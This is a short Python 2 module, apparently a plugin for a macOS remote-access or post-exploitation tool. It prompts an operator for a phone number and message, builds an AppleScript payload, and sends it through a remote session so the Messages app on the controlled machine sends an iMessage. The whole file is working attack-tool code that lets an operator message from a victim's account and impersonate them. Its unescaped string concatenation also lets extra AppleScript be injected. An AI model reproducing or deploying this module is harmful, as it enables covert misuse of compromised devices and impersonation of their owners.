import modules.helper as h

class command:
    def __init__(self):
        self.name = "imessage"
        self.description = "Send message through the messages app."
        self.type = "applescript"

    def run(self,session,cmd_data):
        #do something with session if you want
        #we can prompt for input
        phone = raw_input(h.WW+"[>]"+h.WHITE+" iMessage Recipient: "+h.ENDC)
        message = raw_input(h.WW+"[>]"+h.WHITE+" iMessage Message: "+h.ENDC)
        #send applescript payload
        payload = """tell application "Messages"
        set targetService to 1st service whose service type = iMessage
        set targetBuddy to buddy \""""+phone+"""\" of targetService
        send \""""+message+"""\" to targetBuddy
        end tell"""
        cmd_data.update({"args":payload})
        cmd_data.update({"cmd":self.type})
        result = session.send_command(cmd_data)
        if result and result != "(null)":
            print result
